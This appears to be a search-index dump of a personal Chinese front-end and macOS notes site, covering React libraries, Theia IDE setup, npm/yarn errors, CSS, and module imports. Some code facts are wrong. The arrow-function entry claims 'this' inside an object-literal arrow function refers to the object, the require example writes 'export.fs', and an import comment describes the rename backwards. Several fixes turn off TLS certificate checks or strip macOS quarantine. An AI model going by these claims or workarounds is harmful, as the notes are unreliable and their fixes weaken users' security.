导入CSS: @fortawesome/fontawesome-free/css/all.css react安装: yarn add @fortawesome/fontawesome @fortawesome/react-fontawesome @fortawesome/fontawesome-free --save 通过名称使用: {\n  \"type\": \"page\",\n  \"body\": {\n    \"type\": \"icon\",\n    \"icon\": \"cloud\"\n  }\n} 也支持用url: {\n  \"type\": \"page\",\n  \"body\": {\n    \"type\": \"icon\",\n    \"icon\": \"https://suda.cdn.bcebos.com/images%2F2021-01%2Fdiamond.svg\"\n  }\n} icon 默认支持fontawesome v4(vendor默认为 \"fa\" 表示v4)，\n如果想要支持 v5 以及 v6 版本的 fontawesome 请设置 vendor 为空字符串: {\n  \"type\": \"icon\",\n  \"icon\": \"far fa-address-book\",\n  \"vendor\": \"\"\n}, v5 用 far/fas 等表示前缀;\n详细V5图标库见: https://fontawesome.com/v5/search?m=free v6 用 fa-regular / fa-solid 等表示前缀: {\n  \"type\": \"icon\",\n  \"icon\": \"fa-regular fa-address-book\",\n  \"vendor\": \"\"\n}, 详细V6图标库见: https://fontawesome.com/icons/list","tags":"前端","url":"/yq-docs-front-end-frame-amis-amis.html","loc":"/yq-docs-front-end-frame-amis-amis.html"},{"title":"高性能React组件","text":"滚动组件 Virtuoso Virtuoso 是 React 中一个非常强大的滚动组件,它可以实现几十万条数据的高性能滚动。 Virtuoso 的一些主要特性包括: 滚动性能极高 - 通过仅渲染可视区域内的组件来优化滚动性能,能够平滑滚动数十万行数据。 滚动位置追踪 - 精确追踪滚动位置,触发加载更多等功能。 懒加载 - 只有在内容滚动到可视区域时才渲染,提高初始加载速度。 无限加载 - 支持上拉无限加载更多数据。 窗口化 - 仅加载可视区域内的内容,降低内存占用。 可定制 - 提供多种 API 进行定制,可以自由控制滚动效果。 使用 Virtuoso 实现的滚动效果非常流畅顺滑,基本没有卡顿,并且可以承载很大的数据量。\n它利用了虚拟化技术,通过复用 DOM 节点来达到高性能滚动的效果。\n一个常见的 Virtuoso 使用示例: import { Virtuoso } from 'react-virtuoso';\n\n<Virtuoso\n  data={largeDataSource}\n  itemContent={index => {\n    // 渲染行\n  }}\n  onEndReached={loadMore}\n  components={{\n    Footer: () => <div>Footer</div>\n  }}\n/> 在 React 项目中,如果需要实现高性能的大数据量滚动,Virtuoso 是非常好的选择。它可以创建出类似原生应用那么流畅的滚动效果。 （已编辑）","tags":"前端","url":"/yq-docs-front-end-frame-react-High--performance-component.html","loc":"/yq-docs-front-end-frame-react-High--performance-component.html"},{"title":"一些好用的react库","text":"react-tooltip 安装: npm i react-tooltip 用于 鼠标移入 时候的提示显示: <div>\n    <a data-tooltip-id=\"my-tooltip\" data-tooltip-content=\"Hello world!\">\n        ◕‿‿◕\n    </a>\n    <Tooltip id='my-tooltip'></Tooltip>\n</div> 效果 rc-tree 官网: https://www.npmjs.com/package//rc-tree 安装: npm i rc-tree 效果","tags":"前端","url":"/yq-docs-front-end-frame-react-Some-useful-react-libraries.html","loc":"/yq-docs-front-end-frame-react-Some-useful-react-libraries.html"},{"title":"创建自己的IDE","text":"其实跟着官方文档走就行了, 主要可能遇到的问题就是依赖包的问题, 可以直接按照官网文档给的来: https://theia-ide.org/docs/composing_applications/ ,\n复制文档最后一个 package.json 即可 不过这里的就过只是一个基于浏览器的版本,\n如果想要使用 Electron 运行, 那么需要在依赖项中加入 electron 和 @theia/electron ,\n在 theia 项中加入目标为 electron 即可: \"theia\": {\n  \"target\": \"electron\"\n} 还需要指定一下 electron 的main文件(启动文件): \"main\": \"lib/backend/electron-main.js\", 如果是自定义的启动文件, 需要在自定义启动文件里手动 require 导入一下这个包. 这里不需要手动去弄一个 electron 启动的js, 因为theia内部已经定义好了,\n只需要制定一下目标, 以及构建的时候也指定即可: theia rebuild:electron --cacheRoot ./.theia_build/cache 这里加了 cacheRoot , 表示缓存目录, 下次再编的时候就会用这里的比对分析 最终的package.json内容大致如下: {\n  \"private\": true,\n  \"name\": \"theia-ide\",\n  \"main\": \"lib/backend/electron-main.js\",\n  \"dependencies\": {\n    \"@theia/callhierarchy\": \"latest\",\n    \"@theia/electron\": \"&#94;1.41.0\",\n    \"@theia/file-search\": \"latest\",\n    \"@theia/git\": \"latest\",\n    \"@theia/markers\": \"latest\",\n    \"@theia/messages\": \"latest\",\n    \"@theia/navigator\": \"latest\",\n    \"@theia/outline-view\": \"latest\",\n    \"@theia/plugin-ext-vscode\": \"latest\",\n    \"@theia/preferences\": \"latest\",\n    \"@theia/preview\": \"latest\",\n    \"@theia/search-in-workspace\": \"latest\",\n    \"@theia/terminal\": \"latest\",\n    \"@theia/vsx-registry\": \"latest\",\n    \"electron\": \"&#94;26.2.1\"\n  },\n  \"devDependencies\": {\n    \"@theia/cli\": \"latest\",\n    \"electron\": \"&#94;26.2.1\"\n  },\n  \"scripts\": {\n    \"prepare\": \"yarn run clean && yarn build && yarn run download:plugins\",\n    \"clean\": \"theia clean\",\n    \"build\": \"theia rebuild && theia build --mode development\",\n    \"rebuild\": \"theia rebuild:electron --cacheRoot ./.theia_build/cache\",\n    \"start\": \"theia start --plugins=local-dir:plugins\",\n    \"download:plugins\": \"theia download:plugins\"\n  },\n  \"theia\": {\n    \"target\": \"electron\"\n  },\n  \"theiaPluginsDir\": \"plugins\",\n  \"theiaPlugins\": {\n    \"vscode-builtin-extensions-pack\": \"https://open-vsx.org/api/eclipse-theia/builtin-extension-pack/1.50.1/file/eclipse-theia.builtin-extension-pack-1.50.1.vsix\"\n  },\n  \"theiaPluginsExcludeIds\": [\n    \"ms-vscode.js-debug-companion\",\n    \"vscode.extension-editing\",\n    \"vscode.git\",\n    \"vscode.git-ui\",\n    \"vscode.github\",\n    \"vscode.github-authentication\",\n    \"vscode.microsoft-authentication\"\n  ]\n} 要启动的话, 直接 yarn install 然后 yarn prepare 编译构建下,\n再 yarn start 启动即可, 注意解决这期间的报错等 如果需要ts, 在项目根手动创建 tsconfig.json , 内容大致如下, 按需修改: {\n  \"compilerOptions\": {\n    \"baseUrl\": \".\",\n    \"emitDecoratorMetadata\": true,\n    \"experimentalDecorators\": true,\n    \"module\": \"commonjs\",\n    \"moduleResolution\": \"node\",\n    \"noImplicitAny\": true,\n    \"paths\": {\n      //      \"*\": [\"src/*\"]\n    },\n    \"removeComments\": false,\n    \"sourceMap\": true,\n    \"strict\": true,\n    \"suppressImplicitAnyIndexErrors\": true,\n    \"target\": \"esnext\",\n    \"rootDir\": \"src\",\n    \"outDir\": \"out\",\n    \"jsx\": \"react\"\n  },\n  \"include\": [\n    \"src\"\n  ],\n  \"exclude\": [\n    \"node_modules\"\n  ]\n} 附: package.json 稍微完善一点的scripts: \"scripts\": {\n  \"build\": \"yarn -s compile && yarn -s bundle\",\n  \"bundle\": \"yarn rebuild && theia build --mode development\",\n  \"clean\": \"theia clean\",\n  \"compile\": \"tsc -b\",\n  \"lint\": \"theiaext lint\",\n  \"rebuild\": \"theia rebuild:electron --cacheRoot ./.theia-build\",\n  \"start\": \"theia start --plugins=local-dir:plugins\",\n  \"start:debug\": \"yarn -s start --log-level=debug --remote-debugging-port=9222\",\n  \"start:watch\": \"concurrently --kill-others -n tsc,bundle,run -c red,yellow,green \\\"tsc -b -w --preserveWatchOutput\\\" \\\"yarn -s watch:bundle\\\" \\\"yarn -s start\\\"\",\n  \"test\": \"electron-mocha --timeout 60000 \\\"./lib/test/**/*.espec.js\\\"\",\n  \"watch\": \"concurrently --kill-others -n tsc,bundle -c red,blue \\\"tsc -b -w --preserveWatchOutput\\\" \\\"yarn -s watch:bundle\\\"\",\n  \"watch:bundle\": \"theia build --watch --mode development\",\n  \"watch:compile\": \"tsc -b -w\"\n}","tags":"前端","url":"/yq-docs-front-end-frame-theia-Create-your-own-IDE.html","loc":"/yq-docs-front-end-frame-theia-Create-your-own-IDE.html"},{"title":"不同位置调用时的this指向问题","text":"举例, 比如React父组件将自己的方法传给子组件,\n然后子组件再调用此方法. 这个时候可以进入这个传递的方法的内部,\n但是, 如果方法内有使用到 this , 那么这个时候的 this 是当前的指针\n而不是父组件实例的指针, 方法一: bind 这个时候可以用 bind 来解决这个问题, 若原来传给子组件的是: this.close 改成: this.close.bind(this) 即可. 这里的 this 相当于Python的self 注解 仅可用于传递的是回调, 而非值 若回调内不含this调用可以不bind 方法二: 箭头函数 用例: () => {this.close()} 在 TypeScript 的箭头函数中,this 的指向是继承外层作用域的this,而不是指向箭头函数本身。 主要原因有两个: 箭头函数不会创建自己的this,它只会从自己的作用域链的上一层继承this。 TypeScript 的箭头函数会按照 ES6 的规范实现,其中明确规定了箭头函数内的this与外层this绑定。 举例来说: const obj = {\n  foo: () => {\n    //这里的this指向obj\n    console.log(this)\n  }\n}\n\nobj.foo() // obj 在上例中,箭头函数foo()继承了obj的this, 所以在函数内部打印的this是obj对象,而不是箭头函数本身 总结 bind和箭头函数都可以将this指针绑定为定义时的环境,\n而非调用时的环境.","tags":"前端","url":"/yq-docs-front-end-question-Arrow-function-this-point-to-the-problem.html","loc":"/yq-docs-front-end-question-Arrow-function-this-point-to-the-problem.html"},{"title":"包管理器-常见报错","text":"yarn install时候下载ripgrep代理错误 报错局部信息: GET https://api.github.com/repos/microsoft/ripgrep-prebuilt/releases/tags/v13.0.0-2\nDeleting invalid download cache\nDownloading ripgrep failed: TypeError [ERR_INVALID_PROTOCOL]: Protocol \"https:\" not supported. Expected \"http:\" 或者: Error: Cannot find module '@vscode/ripgrep/bin/rg' 这里是需要下载github的资源,\n而由于众所周知的原因, 下载不了, 所以用clash配置了代理,\n并给yarn与node都设置了代理,\n这里报错是某个node模块的问题,\n尝试多次后都无法解决, 后面在 https://github.com/microsoft/vscode-ripgrep/issues/26 看到了一个解决办法: 1. Clone ripgrep locally: git clone git@github.com:microsoft/vscode-ripgrep ~/vscode-ripgrep\n2. run yarn in that folder (this seems to work even behind proxy)\n3. cp bin/rg ~/vscode-repo-path/node_modules/@vscode/ripgrep\n4. run yarn in your vscode repo path again 大致code如下: git clone https://github.com/microsoft/vscode-ripgrep.git\ncd vscode-ripgrep\nyarn\ncp bin/rg ../myproject/node_modules/@vscode/ripgrep 时隔多日, 再补充一下,\n还有种情况可能是包名没有更新, package.json 使用了旧版的 vscode-ripgrep , 而旧版名下只能下载到老版本,\n导致的报错,\n旧的写法: \"vscode-ripgrep\": \"&#94;1.12.1\", 新的写法: \"@vscode/ripgrep\": \"1.15.9\", yarn 安装时候证书过期 如: error ~/test-electron-win/node_modules/electron: Command failed.\nExit code: 1\nCommand: node install.js\nArguments:\nDirectory:~/test-electron-win/node_modules/electron\nOutput:\nRequestError: certificate has expired\nat ClientRequest.<anonymous> 网上这个问题很多, 且好多年来一直都有, 但是解决办法寥寥无几,\n最终还是设置忽略环境变量解决. 参考: https://github.com/realm/realm-js/issues/5228#issuecomment-1375191886 先使用环境变量来忽略证书验证: NODE_TLS_REJECT_UNAUTHORIZED=0 yarn install 貌似这样安装一次后就有缓存了, 然后改版本以后直接 yarn install 也可以,\n不确定是否在缓存的话, 就还是加上 NODE_TLS_REJECT_UNAUTHORIZED 吧. Hostname/IP does not match certificate's altnames 多见于安装包依赖的时候出毛病, 之前加了淘宝源, 不知道为啥突然出毛病了.\n本地原来的 $ npm config list ; \"global\" config from /usr/local/etc/npmrc ; proxy = \"http://127.0.0.1:60742\" ; overridden by user ; registry = \"http://registry.npm.taobao.org/\" ; overridden by user ; \"user\" config from /Users/yanque/.npmrc electron_mirror = \"https://npm.taobao.org/mirrors/electron/\" proxy = \"http://127.0.0.1:60742\" registry = \"http://registry.npm.taobao.org/\" ; node bin location = /usr/local/bin/node ; node version = v18.18.0 ; npm local prefix = /Users/yanque/Project/Code/WebStorm/repo-managemnt-desktop ; npm version = 9 .8.1 ; cwd = /Users/yanque/Project/Code/WebStorm/repo-managemnt-desktop ; HOME = /Users/yanque ; Run ` npm config ls -l ` to show all defaults. 完整报错: npm ERR! RequestError: Hostname/IP does not match certificate's altnames: Host: npm.taobao.org. is not in the cert's altnames: DNS:*.tbcdn.cn, DNS:*.taobao.com, DNS:*.alicdn.com, DNS:*.cmos.greencompute.org, DNS:cmos.greencompute.org, DNS:m.intl.taobao.com, DNS:*.mobgslb.tbcache.com, DNS:*.alikunlun.com, DNS:alikunlun.com, DNS:*.django.t.taobao.com, DNS:alicdn.com, DNS:*.tbcache.com, DNS:*.tmall.com, DNS:*.1688.com, DNS:*.3c.tmall.com, DNS:*.alibaba.com, DNS:*.aliexpress.com, DNS:*.aliqin.tmall.com, DNS:*.alitrip.com, DNS:*.aliyun.com, DNS:*.cainiao.com, DNS:*.cainiao.com.cn, DNS:*.chi.taobao.com, DNS:*.chi.tmall.com, DNS:*.china.taobao.com, DNS:*.dingtalk.com, DNS:*.etao.com, DNS:*.feizhu.cn, DNS:*.feizhu.com, DNS:*.fliggy.com, DNS:*.fliggy.hk, DNS:*.food.tmall.com, DNS:*.jia.taobao.com, DNS:*.jia.tmall.com, DNS:*.ju.taobao.com, DNS:*.juhuasuan.com, DNS:*.lw.aliimg.com, DNS:*.m.1688.com, DNS:*.m.alibaba.com, DNS:*.m.alitrip.com, DNS:*.m.cainiao.com, DNS:*.m.etao.com, DNS:*.m.taobao.com, DNS:*.m.taopiaopiao.com, DNS:*.m.tmall.com, DNS:*.m.tmall.hk, DNS:*.mei.com, DNS:*.taopiaopiao.com, DNS:*.tmall.hk, DNS:*.trip.taobao.com, DNS:*.xiami.com, DNS:1688.com, DNS:alibaba.com, DNS:aliexpress.com, DNS:alitrip.com, DNS:aliyun.com, DNS:cainiao.com, DNS:cainiao.com.cn, DNS:dingtalk.com, DNS:etao.com, DNS:feizhu.cn, DNS:feizhu.com, DNS:fliggy.com, DNS:fliggy.hk, DNS:juhuasuan.com, DNS:mei.com, DNS:taobao.com, DNS:taopiaopiao.com, DNS:tmall.hk, DNS:xiami.com, DNS:tmall.com, DNS:*.cloudvideocdn.taobao.com, DNS:cloudvideocdn.taobao.com, DNS:tbcdn.cn 换成原来的官方镜像 # 注释这部分是我自己之前有现在不需要的 # $ npm config delete proxy # $ npm config delete proxy -g # $ npm config delete electron_mirror: -g # $ npm config delete electron_mirror: $ npm config set registry http://registry.npmjs.org -g\n$ npm config set registry http://registry.npmjs.org\n\n$ npm config list ; \"global\" config from /usr/local/etc/npmrc ; registry = \"http://registry.npmjs.org\" ; overridden by user ; \"user\" config from /Users/yanque/.npmrc registry = \"http://registry.npmjs.org\" 注解 本地因为yarn比较常用, 我删掉后还更新了下yarn npm upgrade yarn -g 第二种方式是禁用掉ssl检查 # npm set strict-ssl false $ npm config set strict-ssl false -g","tags":"前端","url":"/yq-docs-front-end-question-Bag-Manager-Common-errors.html","loc":"/yq-docs-front-end-question-Bag-Manager-Common-errors.html"},{"title":"浏览器缓存清理","text":"safari清理缓存 Command + , 打开设置: 隐私 -> 管理网站数据 -> `选中需要移除的网站(可搜索)` -> 移除 safari 清理某网站缓存","tags":"前端","url":"/yq-docs-front-end-question-Browser-cache-cleaning.html","loc":"/yq-docs-front-end-question-Browser-cache-cleaning.html"},{"title":"JSX或TSX的花括号","text":"单花括号表示进入JS语法环境,\n双花括号表示JS环境内创建一个对象","tags":"前端","url":"/yq-docs-front-end-question-Bunder-of-JSX-or-TSX.html","loc":"/yq-docs-front-end-question-Bunder-of-JSX-or-TSX.html"},{"title":"CSS排除指定的选择器","text":"可参考 :doc:`` 现有css类属性a,b,c; a下包含b和c, b下包含c 如何写css选择器, 选择 a下的 不属于b 的c: .a .c:not(.b .c)","tags":"前端","url":"/yq-docs-front-end-question-CSS-exclude-the-specified-selector.html","loc":"/yq-docs-front-end-question-CSS-exclude-the-specified-selector.html"},{"title":"自定义样式的Checkbox","text":"比如圆形边框 默认情况下，input 元素的复选框（checkbox）的外观是由浏览器自身的样式决定的，\n并且这些样式通常不允许直接通过 CSS 的 border-radius 属性来设置圆形边框。 先使用i标签实现一个简单的Checkbox: import React from 'react';\n\ninterface CheckedProps{\n    name?: string\n    initChecked?: boolean\n    description?: string\n}\n\nexport class Checkbox extends React.Component<CheckedProps, any> {\n    state = {\n        boxChecked: false\n    }\n\n    protected changeChecked() {\n        this.setState({boxChecked: !this.state.boxChecked})\n    }\n\n    render() {\n        if (typeof this.props.initChecked === \"boolean\"){\n            this.setState({boxChecked: this.props.initChecked})\n        }\n\n        const description = this.props.description\n\n        return (\n            <div className={'custom-checkbox-0'}>\n                <input\n                    type={'checkbox'}\n                    checked={this.state.boxChecked}\n                />\n                <i onClick={() => {this.changeChecked()}} />\n                <span />\n                {description ? (\n                    <div>{description}</div>\n                ) : null}\n            </div>\n        );\n    }\n} 主要是样式的设置: /*\n    input标签样式\n    input禁止掉默认的点击行为, 交给i标签\n*/\n.custom-checkbox-0 > input[type=\"checkbox\"] {\n    position: absolute;\n    clip: rect(1px, 1px, 1px, 1px);\n    pointer-events: none;\n}\n\n/*\n    普通状态下 **<i>标签内容** 的样式\n    即没有打勾\n*/\n.custom-checkbox-0 > i::before{\n    content: \"\";\n    position: absolute;\n    left: 50%;\n    top: 50%;\n\n    border-color: whitesmoke;\n    border-style: solid;\n    border-width: 0 ;\n    transform: translate(-50%, -90%) rotate(-40deg);\n}\n\n/*\n    <i> 标签的样式\n\n    此处是宝蓝色背景, 接管input的点击行为, 长宽设置为16\n*/\n.custom-checkbox-0 > i {\n    background-color: royalblue;\n    display: inline-block;\n    vertical-align: text-bottom;\n    position: relative;\n    pointer-events: all;\n\n    width: 16px;\n    height: 16px;\n    cursor: pointer;\n    border: 1px solid;\n\n    border-radius: 50%;   /* 设置圆形 */\n}\n\n/*\n    <i> 标签选中时的外观\n\n    即打勾 (实现原理是只显示左边和右边的边框然后旋转, 看起来就是个勾了)\n*/\n.custom-checkbox-0 > input:checked + i:before {\n    width: 8px;\n    height: 4px;\n    border-width: 0 0 1px 1px;\n}\n\n\n/*.custom-checkbox-0 > input[disabled]:checked + i:before{*/\n/*    width: 0;*/\n/*    height: 0;*/\n/*    border-width: 0;*/\n/*}*/ 注解 好像很多东西的默认样式都不是很好改, 得借助其他元素 且纯用css来更改很难","tags":"前端","url":"/yq-docs-front-end-question-Checkbox-of-custom-style.html","loc":"/yq-docs-front-end-question-Checkbox-of-custom-style.html"},{"title":"electron+react+ts","text":"参考: https://www.cnblogs.com/bleaka/p/16184636.html","tags":"前端","url":"/yq-docs-front-end-question-Electron+React+TS.html","loc":"/yq-docs-front-end-question-Electron+React+TS.html"},{"title":"前端-函数调用与组件调用","text":"函数调用与组件调用的区别 假设有一个函数组件: const Selector = () => {\n\n  return (<div></div>)\n} 这个时候函数调用: Selector() 与组件调用: <Selector/> 基本上是一致的. 但是, 如果函数组件包含了react状态: const Selector = () => {\n  const [ready, setReady] = useState(true)\n\n  return (<div></div>)\n} 且如果是在类中调用, 那么只能用: <Selector/> 貌似是因为直接 Selector() 相当于嵌入这个函数, 而类中不能使用状态. 注解 当作组件使用时, 组件名首字母必须大写. 小写的会当作html组件, 不识别","tags":"前端","url":"/yq-docs-front-end-question-Front-end-function-call-and-component-call.html","loc":"/yq-docs-front-end-question-Front-end-function-call-and-component-call.html"},{"title":"import与require","text":"import与require 是前端导包使用的方式, 遵循两种不同的规范 import\n- import/export 是ES6引入的新规范，因为浏览器引擎兼容问题，需要在node中用babel将ES6语法编译成ES5语法\n- import 是编译时调用，所以必须放在文件的开头\n- import 是解构过程。使用import导入模块的属性或者方法是引用传递。且import是read-only的，值是单向传递的。default是ES6 模块化所独有的关键字，export default {} 输出默认的接口对象，如果没有命名，则在import时可以自定义一个名称用来关联这个对象 require\n- require/exports 是 CommonJS/AMD 中为了解决模块化语法而引入的\n- require 是运行时调用，所以理论上可以运作在代码的任何地方\n- require 是赋值过程，其实require的结果就是对象、数字、字符串、函数等，再把结果赋值给某个变量。它是普通的值拷贝传递。\n- 通过require引入基础数据类型时,属于复制该变量\n- 通过require引入复杂数据类型时, 属于浅拷贝该对象\n- 出现模块之间循环引用时, 会输出已执行的模块, 未执行模块不会输出\n- CommonJS规范默认export的是一个对象,即使导出的是基础数据类型 写法 require/exports 方式的写法比较统一: // exports\nexport.fs = fs\nmodule.exports = fs\n\n// require\nconst module = require('module') import/export 方式的写法就相对丰富些: // export\nexport default fs;\nexport const fs;\nexport function part;\nexport { part1, part2 };\nexport * from 'fs';\n\n// import\nimport fs  from 'fs';\nimport { newFs as fs } from 'fs';  // ES6语法, 将fs重命名为newFs, 命名冲突时常用\nimport { part } from fs;\nimport fs, { part } from fs;","tags":"前端","url":"/yq-docs-front-end-question-Import-and-Require.html","loc":"/yq-docs-front-end-question-Import-and-Require.html"},{"title":"Object原型方法","text":"对象拷贝-Object.assign() Object.assign() 浅拷贝对象属性, 返回新的对象 如果需要深拷贝, 可以: JSON.parse(JSON.stringify(obj))","tags":"前端","url":"/yq-docs-front-end-question-Object-prototype-method.html","loc":"/yq-docs-front-end-question-Object-prototype-method.html"},{"title":"package.json增加本地模块","text":"方案一: 直接添加本地路径 如果不介意不使用语意化版本, 可以直接: yarn add link:./src/@ide/right-context-menu -W 或者: yarn add file:./src/@ide/right-context-menu -W 两个效果基本一致, -W 强制指定给根的package.json添加, 效果大概如下: \"dependencies\": {\n  \"@ide/right-context-menu\": \"link:./src/@ide/right-context-menu\"\n} 或者: \"dependencies\": {\n  \"@ide/right-context-menu\": \"file:./src/@ide/right-context-menu\"\n} 方案二: 使用语意化版本(这个不行, 看下一个) 但是如果想使用语意化版本, 如: \"dependencies\": {\n  \"@ide/right-context-menu\": \"0.1.0\"\n} 需要先在 package.json 增加上述语意化版本配置, 然后再链接: yarn add link:./src/@ide/right-context-menu -W 方案三: 使用语意化版本的另一种方式(问的AI) 如果要通过 yarn 来安装本地模块并生成语义化版本,可以这样操作: 在本地模块中定义版本号,例如在 package.json 中设置 \"version\": \"1.0.0\" 在主项目中,使用 yarn link 来链接本地模块:\n先注册本地模块, 在本地模块中执行: cd 本地模块所在路径\nyarn link 然后返回项目根目录, 在主项目中执行: yarn link 模块名 这时可以在主项目中直接引用和使用本地模块了 通过 yarn add 保存依赖时,会自动读取到本地模块的版本号,\n并写入主项目的 package.json: yarn add 模块名 package.json 中将会显示: \"dependencies\": {\n  \"模块名\": \"1.0.0\"\n} 注解 有时候会有问题, add的时候还是从仓库去找, 而不是直接用本地的... 所以这时候还是得手动加到package.json里面去...\n不记得之前是不是有手动加了... 这样就可以通过 yarn 实现在主项目中以语义化版本的方式安装和依赖本地模块。\n主要利用了 yarn link 来关联本地模块,并通过 yarn add 来写入正确的依赖版本号。\n同时要注意,本地模块的代码改动还会直接影响到主项目,要控制版本并发布,还需要采取额外的措施。 （已编辑） 本地模块的编译 默认情况下, yarn/npm只会处理主项目的构建等 比如本地模块如果是ts,\n最笨的办法就是直接去模块目录手动执行 tsc 有一个叫 lerna 的模块, 可以递归编译, 从而达到编译所有本地模块的效果,\n使用: lerna init\nlerna run build 编译报错-node_model的报错 如果构建的时候, 发现编译的确实是本地模块, 但是因为导包, 从而出现了 node_modules 下面模块的检查报错, 可以在 tsconfig.json 配置(根项目): {\n  \"compilerOptions\": {\n    \"skipLibCheck\": true\n  }\n} 或者配置 learn.json \"command\": {\n  \"build\": {\n    \"typescript\": {\n      \"tsConfigOverride\": {\n        \"skipLibCheck\": true\n      }\n    }\n  }\n} 也可以直接命令行: tsc --skipLibCheck 注解 想不通的一点是 tsc 没有报错, 但是learn触发的有这个报错; 编译问题-会在根目录拷贝一份源码到配置的outDir 解决: 去除根 tscofig.json 的以下内容: \"compilerOptions\": {\n    \"rootDir\": \"src\",\n    \"outDir\": \"lib\",\n}\n\n\"include\": [\n    \"src\"\n], 注释掉即可","tags":"前端","url":"/yq-docs-front-end-question-Package.json-adds-local-modules.html","loc":"/yq-docs-front-end-question-Package.json-adds-local-modules.html"},{"title":"vscode项目的编译运行","text":"克隆项目: git clone https://github.com/microsoft/vscode.git 项目根目录下载插件, node模块: yarn 编译: yarn run compile 运行: bash scripts/code.sh 看了网上几年前的帖子说调试需要 yarn run watch 来debug, 但是之要watch了, 就跑不了code.sh,\n后面发现, watch要等到跑完才行, 跑到: Finished compilation extensions xxx 更新 clone后下面默认有一个 .vscode/launch.json , 可以使用vscode来完美的断点调试(默认第一个就是) webstorm 试了半天没搞懂怎么调断点. 参考了 .vscode/launch.json , 大致看了一下, 有些步骤没搞懂.","tags":"前端","url":"/yq-docs-front-end-question-The-compilation-and-operation-of-the-vSCode-project.html","loc":"/yq-docs-front-end-question-The-compilation-and-operation-of-the-vSCode-project.html"},{"title":"html下url编码","text":"参考:: HTML URL 编码参考手册 URL 编码（百分比编码） URL 编码将字符转换为可通过因特网传输的格式。\nURL 只能使用 ASCII 字符集 通过因特网进行发送。\n由于 URL 通常包含 ASCII 集之外的字符，因此必须将 URL 转换为有效的 ASCII 格式。\nURL 编码使用后跟十六进制数字的 \"%\" 替代不安全的 ASCII 字符。\nURL 不能包含空格。URL 编码通常使用加号（+）或 %20 替代空格。 ASCII 编码参考 字符 编码后的结果 'space'(空格) %20","tags":"前端","url":"/yq-docs-front-end-question-URL-encoding-under-html.html","loc":"/yq-docs-front-end-question-URL-encoding-under-html.html"},{"title":"mac一直弹登录项","text":"清空登录项: sfltool resetbtm 或者改权限: 555 sfltool dumpbtm: 打印登录项和后台项的当前状态，包括载入的 servicemanagement 有效负载 UUID。 sfltool resetbtm：还原登录项和后台项数据。如果在测试间使用此命令，建议用户也重新启动自己的电脑。 见: 在 Mac 上管理登录项和后台任务","tags":"操作系统","url":"/yq-docs-operating-system-Mac-question-MAC-has-been-playing-login-items.html","loc":"/yq-docs-operating-system-Mac-question-MAC-has-been-playing-login-items.html"},{"title":"MacApp提权","text":"见 MacOS App代码申请管理员权限 AuthorizationExecuteWithPrivileges 使用ServiceManagement.framework注册LaunchdDaemon AppleScript: do shell script \"...\" with administrator privileges","tags":"操作系统","url":"/yq-docs-operating-system-Mac-question-MacAPP-right.html","loc":"/yq-docs-operating-system-Mac-question-MacAPP-right.html"},{"title":"Mac-Xcode 多版本","text":"github上有现成的项目方便切换,\n地址: https://github.com/XcodesOrg/XcodesApp/tags 使用: 需要先手动登陆Apple ID 注解 需要对应版本的command line 其他方式 手动命令行操作, 参考地址: https://juejin.cn/post/7251792725070217275 查看当前版本指令: # 或者 xcode-select -p\ngcc --version 切换版本指令: sudo xcode-select --switch <xcode_folder_path> 上述失败, 现在版本是Mac OS14.1, 能下载不能打开, 作罢","tags":"操作系统","url":"/yq-docs-operating-system-Mac-question-Xcode-multi--version.html","loc":"/yq-docs-operating-system-Mac-question-Xcode-multi--version.html"},{"title":"问题总结","text":"App窗口弹出在最上层 这个分两种情况, 一个是普通App,\n一个是系统级App 对于普通App的View 单独View的显示需要先讲其转换为NsWindow然后配置显示: import SwiftUI\n\nextension TipView{\n\n    // MARK: - Interface\n\n    func showViewOnNewWindowInSpecificTime(during timer: CGFloat) -> NSWindow {\n        let alertWindow = self.setWindow()\n        displayAsAlert(win: alertWindow, Timer: timer)\n        return alertWindow\n    }\n\n\n    // MARK: - Attribute\n\n    private func displayAsAlert(win:NSWindow, Timer:Double) {\n\n        // 在当前窗口上显示\n        win.level = .floating\n\n        win.isMovableByWindowBackground = false\n        win.titleVisibility = .hidden\n        win.titlebarAppearsTransparent = true\n        win.isOpaque = false\n        win.styleMask.remove(.closable)\n        win.styleMask.remove(.fullScreen)\n        win.styleMask.remove(.miniaturizable)\n        win.styleMask.remove(.fullSizeContentView)\n        win.styleMask.remove(.resizable)\n        win.backgroundColor = NSColor.clear\n        win.orderFrontRegardless()\n\n\n        DispatchQueue.main.asyncAfter(deadline: .now() + Timer) {\n            win.close()\n        }\n    }\n\n    private func setWindow() -> NSWindow {\n        NSWindow(contentViewController: NSHostingController(rootView: self))\n    }\n} 主要是 win.level = .floating , 设置为浮动窗口 但是若想弹出在其他全屏App上就不行了. 系统级App 这里的 系统级App 指的是设置了 Application is agent (UIElement) 为 YES 的APP, 此配置作用详见 Xcode的Info配置 设置后默认就是系统级的App, 不需要再像普通App那样设置浮动窗口,\n默认可以显示在其他全屏App上 查看固态寿命 也支持电池循环数啥的,\n使用 smartctl 指令: smartctl -a /dev/disk0 xxx 已损坏，无法打开。你应该将它移到废纸篓。 解决办法↓↓↓ 在终端中输入: xattr -cr # (这里要注意后面有个空格), 移除应用的安全隔离属性. 将提示已损坏，无法打开的程序图标拖到命令栏中。 拖入命令行后， 拖入程序图标后类似显示 xattr -cr /Applications/XXX.app ，然后回车，再去打开程序即可正常运行。 参考: macOS 提示：\"应用程序\" 已损坏，无法打开的解决方法总结 两招解决Mac安装软件提示 已损坏无法打开 请移到废纸篓","tags":"操作系统","url":"/yq-docs-operating-system-Mac-question-conclusion-of-issue.html","loc":"/yq-docs-operating-system-Mac-question-conclusion-of-issue.html"},{"title":"fork","text":"进程0是系统引导时创建的一个特殊进程，\n在其调用fork创建出一个子进程（即pid=1，又称init）后，\n进程0就变成了交换进程（有时也被称为空闲进程），而进程1（init）就是其他进程的祖先 linux除了pid=0的进程都是其他进程使用系统调用fork函数创建的 fork() 函数的主要作用是在父进程调用的基础上创建一个其的子进程。 fork() 函数有一个特点就是只调用一次却会返回两次， 一次是父进程返回的值 一个大于0的数 （即他创建的子进程的PID，PID 是操作系统中进程的唯一标识 ） 而另外一次则是子进程返回的值 为0。 还有一种情况就是父进程调用该函数的时候如果返回的 <0 的数则说明创建进程失败（失败的原因有很多）。 另外一个值得注意的是调用 fork() 函数 的时候 子进程是接着该调用后的代码继续执行的，\n如果其后还存在调用fork() 函数 子进程也可以作为父进程创建它的子进程。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Built--in-function-fork.html","loc":"/yq-docs-operating-system-linux-Built--in-function-fork.html"},{"title":"文件系统详解","text":"文件系统的基本组成 